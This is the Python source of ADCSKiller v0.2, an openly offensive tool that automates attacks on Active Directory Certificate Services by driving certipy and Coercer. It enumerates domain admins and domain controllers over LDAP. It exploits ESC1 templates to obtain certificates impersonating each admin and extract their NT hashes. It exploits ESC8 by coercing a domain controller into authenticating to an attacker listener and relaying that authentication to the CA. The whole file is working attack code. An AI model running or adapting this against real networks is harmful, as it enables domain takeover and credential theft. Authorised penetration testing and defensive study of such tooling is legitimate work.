#!/usr/bin/python

""" ADCS exploitation automation

This tool tries to automate the process of exploiting ADCS by weaponizing certipy. This is the first draft.

References:
https://github.com/ly4k/Certipy
https://github.com/p0dalirius/Coercer

MIT License

Copyright (c) 2023 grimlockx

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

__author__ = "grimlockx"
__license__ = "MIT"
__version__ = "0.2"


import argparse
import subprocess
import re
import ldap3
import json
import re
import threading
import time
from datetime import datetime


class CertipyRelay(threading.Thread):
    def __init__(self, threadID, name, ca):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.target_ca = ca
        
    def run(self):
        print(f'[+] Started Relaying to {self.target_ca}')
        relaying_results = subprocess.Popen(["certipy", "relay", "-ca", self.target_ca, "-template", "DomainController"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
        for line in relaying_results.stdout:
            print(line.strip())

        
class Coercer(threading.Thread):
    def __init__(self, threadID, name, domain, username, password, target_dc, listener_ip):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.domain = domain
        self.username = username
        self.password = password
        self.target_dc = target_dc
        self.listener_ip = listener_ip
        
    def run(self):
        print(f'[+] Started coercion from {self.target_dc} to {self.listener_ip}')
        subprocess.run(["Coercer", "coerce", "-u", self.username, "-p", self.password, "-d", self.domain, "-t", self.target_dc, "-l", self.listener_ip, "--always-continue"], capture_output=True, text=True).stdout
        print(f'[+] Finished coercion from {self.target_dc} to {self.listener_ip}')
        
class Exploit:
    def __init__(self, domain, username, password, target, level, lhost) -> None:
        self.__domain = domain
        self.__domain_parts = domain.split(".")
        self.__domain_cn = ''.join([f'dc={e},' for e in self.__domain_parts[:-1]]) + f'dc={self.__domain_parts[-1]}'
        self.__username = username
        self.__password = password
        self.__target = target
        self.__level = level
        self.__lhost = lhost
        self.__domain_admins = []
        self.__dc_synced = False
        self.__vulnerable_certificate_templates = {}
        self.__vulns = []
        self.__dc = []

    def get_certipy_results(self) -> bool:
        # Create a output filename prefix
        current_datetime = datetime.now()
        self.__certipy_output_prefix = current_datetime.strftime("%Y%m%d%H%M%S")

        # Try to get ceritpy results using the fully quallified domain name
        print("[*] Trying to find vulnerable certificate templates")
        certipy_results = subprocess.run(["certipy", "find", "-u", f"{self.__username}@{self.__domain}", "-p", self.__password, "-dc-ip", self.__target, "-vulnerable", "-json", "-output", f"{self.__certipy_output_prefix}"], capture_output=True, text=True).stdout

        if "Got error: socket connection error while opening: timed out" in certipy_results: 
            print(f'[-] Connection to the domain controller timed out')
            return False

        # If authentication against LDAP did not work, try to use every single domain part
        if re.search(rf'Invalid credentials', certipy_results):
            if int(self.__level) == 3:
                for d in self.__domain_parts[:-1]:
                    certipy_results = subprocess.run(["certipy", "find", "-u", f"{self.__username}@{d}", "-p", self.__password, "-dc-ip", self.__target, "-vulnerable", "-json", "-output", f"{self.__certipy_output_prefix}"], capture_output=True, text=True).stdout
                    if not re.search(rf'Invalid credentials', certipy_results):
                        print(f"[+] Saved certipy output to {self.__certipy_output_prefix}_Certipy.json")          
                        return True
                    
                return False
            return False
        
        print(f"[+] Saved certipy output to {self.__certipy_output_prefix}_Certipy.json")          
        return True
    
    def bind_to_ldap(self) -> None:
        # Connect & bind to LDAP
        print(f"[*] Trying to bind to ldap://{self.__target}:389")
        l_server = ldap3.Server(f'ldap://{self.__target}:389', get_info=ldap3.ALL)
        try:
            self.__ldap_bind = ldap3.Connection(l_server, user=f'{self.__domain_parts[0]}\\{self.__username}', password=f'{self.__password}', auto_bind=True)
            print(f"[+] Bind to ldap://{self.__target}:389 successful")
        except ldap3.core.exceptions.LDAPSocketOpenError:
            print(f"[-] Binding to ldap://{self.__target}:389 failed")
            print(f"[*] Trying to bind to ldaps://{self.__target}:636")
            l_server = ldap3.Server(f'ldaps://{self.__target}:636', get_info=ldap3.ALL)
            try:
                self.__ldap_bind = ldap3.Connection(l_server, user=f'{self.__domain_parts[0]}\\{self.__username}', password=f'{self.__password}', auto_bind=True)
                print(f"[+] Bind to ldaps://{self.__target}:636 successful")
            except ldap3.core.exceptions.LDAPSocketOpenError:
                print(f"[-] Binding to ldaps://{self.__target}:636 failed\n")
                return False
            except ldap3.core.exceptions.LDAPBindError:
                print(f"[-] Binding to ldaps://{self.__target}:636 failed, invalid credentials\n")
                return False
        except ldap3.core.exceptions.LDAPBindError:
            print(f"[-] Binding to ldap://{self.__target}:389 failed, invalid credentials\n")
            return False
        except ldap3.core.exceptions.LDAPSocketOpenError:
            print(f"[-] Binding to ldap://{self.__target}:389 failed, connection timed out\n")
            return False

    
    def get_domain_admins(self) -> list:
        print(f"[*] Getting Domain SID")
        self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(objectClass=domain)', attributes = ['objectSID'])
        self.__domain_SID = self.__ldap_bind.response[0]['attributes']['objectSid']
        print(f"[+] Received Domain SID: {self.__domain_SID}")

        print(f"[*] Getting Domain Administrators CN of {self.__domain} using objectSID: {self.__domain_SID}-512")
        self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(&(objectCategory=group)(objectSid={self.__domain_SID}-512))', attributes = ['sAMAccountName'])
        self.__domain_admins_cn =  self.__ldap_bind.response[0]['raw_attributes']['sAMAccountName'][0].decode("utf-8")

        print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name '{self.__domain_admins_cn}'")
        self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(&(objectCategory=group)(cn={self.__domain_admins_cn}))', attributes = ['member'])
        for entry in self.__ldap_bind.response[0]['raw_attributes']['member']:
            parsed_entry = entry.decode('utf-8').split(',')
            self.__domain_admins.append(parsed_entry[0][3:])

        # Backup ldap search if searching via sid did not return any results
        if not self.__domain_admins:
            print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name 'Domain Admins'")
            self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(memberOf=cn=Domain Admins,OU=Groups,{self.__domain_cn})', attributes = ['sAMAccountName'])
            for entry in self.__ldap_bind.response:
                try:
                    self.__domain_admins.append(entry['raw_attributes']['sAMAccountName'][0].decode("utf-8"))
                # Filter does probably not only return domain admins
                except KeyError:
                    continue

        if self.__domain_admins:
            print(f"[+] Found Domain Administrators: {self.__domain_admins}\n")
            return self.__domain_admins
        
        print(f"[-] Could not enumerate Domain Administrators")
        return self.__domain_admins

    def fetch_certipy_results(self) -> dict:
        print(f"[+] Parsing certipy output {self.__certipy_output_prefix}_Certipy.json\n")
        try:
            with open(f"{self.__certipy_output_prefix}_Certipy.json", "r") as file:
                certipy_json = json.load(file)

        except Exception as e:
            # TODO tests and exceptions
            print(e)

        # Get target CA
        self.__ca = certipy_json["Certificate Authorities"]['0']['CA Name']
        self.__ca_dns = certipy_json["Certificate Authorities"]['0']['DNS Name']

        # Get Vulnerabilities 
        if 'ESC8' in certipy_json:
            if certipy_json["Certificate Authorities"]['0']['[!] Vulnerabilities']['ESC8']:
                self.__vulns.append('ESC8')

        if 'ESC11' in certipy_json:  
            if certipy_json["Certificate Authorities"]['0']['[!] Vulnerabilities']['ESC11']:
                self.__vulns.append('ESC11')
            
        if self.__vulns:
            print(f'[+] Found vulnerabilities: {self.__vulns}')

        templates = certipy_json['Certificate Templates']
        
        for template in templates.values():
            if "[!] Vulnerabilities" in template:
                vulnerabilities = template["[!] Vulnerabilities"]
                if "ESC1" in vulnerabilities:
                    if "ESC1" not in self.__vulnerable_certificate_templates:
                        self.__vulnerable_certificate_templates["ESC1"] = []
                    
                    self.__vulnerable_certificate_templates["ESC1"].append(template["Template Name"])
                    print(f"Certificate templates vulnerable to ESC1: {self.__vulnerable_certificate_templates['ESC1']}\n")
                    
        return self.__vulnerable_certificate_templates
    
    def get_dcs(self) -> None:
        print(f"[*] Getting Domaincontrollers")
        self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))', attributes = ['distinguishedName'])
        for entry in self.__ldap_bind.response:
            try:
                entry = entry['raw_dn'].decode("utf-8").split(',')
                self.__dc.append(f'{entry[0][3:]}.{self.__domain}')
                
            except KeyError:
                continue
                
        if self.__dc:
            print(f'[+] Found domain controllers: {self.__dc}')

    def run_checks(self) -> None:
        if "ESC1" in self.__vulnerable_certificate_templates:
            self.exploit_esc1()

        if "ESC8" in self.__vulns:
            self.exploit_esc8()

    def exploit_esc1(self) -> None:
        for admin in self.__domain_admins:
            for template in self.__vulnerable_certificate_templates["ESC1"]:
                print(f"[*] Exploiting ESC1 using the {admin} account")
                print(f"[+] Requesting a certificate via RPC as {admin}")
                certipy_results = subprocess.run(["certipy", "req", "-u", f"{self.__username}@{self.__domain}", "-p", self.__password, "-target", self.__target, "-ca", self.__ca, "-template", template, "-upn", admin, "-out", f"{template}_{admin}"], capture_output=True, text=True).stdout
                if "Got certificate" in certipy_results:
                    print(f"[+] Got certificate for UPN {admin} and certificate template {template} and saved it as {template}_{admin}.pfx")
                    print(f"[*] Trying to get NT hash for {admin} using {template}_{admin}.pfx")

                    certipy_results = subprocess.run(["certipy", "auth", "-pfx", f"{template}_{admin}.pfx", "-domain", self.__domain, "-username", admin, "-dc-ip", self.__target], capture_output=True, text=True).stdout

                    if "Got hash for" in certipy_results:
                        nthash = re.search(r"Got hash for '.*': (\w+:\w+)", certipy_results).group(1)
                        print(f"[+] Received NT hash for {admin}: {nthash}")
    
    def exploit_esc8(self) -> None:
        if self.__ca_dns not in self.__dc: # Certificate Authority is not a domain controller
            print(f'[*] Certificate authority {self.__ca_dns} is not a domain controller')
            certipy_thread = CertipyRelay(1, "CertipyRelayThread", self.__ca_dns)
            certipy_thread.start()
            print('[*] Sleep for 5 seconds to wait for Certipy relay setup')
            time.sleep(5)
            
            coercer_thread = Coercer(2, "CoercerThread", self.__domain, self.__username, self.__password, self.__dc[0], self.__lhost)
            coercer_thread.start()
            coercer_thread.join()
            certipy_thread.join()
            
        elif self.__ca_dns in self.__dc and len(self.__dc) >= 2:
            pass # TODO
            
        

# TODO        
class DomainAdmin:
    def __init__(self, cn):
        self.cn = cn



if __name__ == "__main__":
    print(
        """
    
        ▄▄▄      ▓█████▄  ▄████▄    ██████  ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███     
        ▒████▄    ▒██▀ ██▌▒██▀ ▀█  ▒██    ▒  ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒   
        ▒██  ▀█▄  ░██   █▌▒▓█    ▄ ░ ▓██▄   ▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒   
        ░██▄▄▄▄██ ░▓█▄   ▌▒▓▓▄ ▄██▒  ▒   ██▒▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄     
        ▓█   ▓██▒░▒████▓ ▒ ▓███▀ ░▒██████▒▒▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒   
        ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░   
        ▒   ▒▒ ░ ░ ▒  ▒   ░  ▒   ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░   
        ░   ▒    ░ ░  ░ ░        ░  ░  ░  ░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░    
            ░  ░   ░    ░ ░            ░  ░  ░    ░      ░  ░    ░  ░   ░  ░   ░        
                ░      ░                                                               

        """)

    print("\nADCSKiller v0.2 - by Maurice Fielenbach (grimlockx) - Hexastrike Cybersecurity UG (haftungsbeschränkt)\n")
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--domain', dest='domain',type=str, required=True, help='Target domain name. Use FQDN')
    parser.add_argument('-u', '--username', dest='username',type=str, required=True, help='Username')
    parser.add_argument('-p', '--password', dest='password',type=str, required=True, help='Password')
    parser.add_argument('-t', '--target', dest='target',type=str, required=True, help='Target')
    parser.add_argument('-l', '--level', dest='level',type=str, required=True, help='Level 1-3 determines aggressiveness')
    parser.add_argument('-L', '--LHOST', dest='lhost',type=str, required=True, help='Local hostname - An ADIDNS entry might be required')
    args = parser.parse_args()

    exploit = Exploit(args.domain, args.username, args.password, args.target, args.level, args.lhost)
    exploit.get_certipy_results()
    exploit.bind_to_ldap()
    exploit.get_domain_admins()
    exploit.fetch_certipy_results()
    exploit.get_dcs()
    exploit.run_checks()
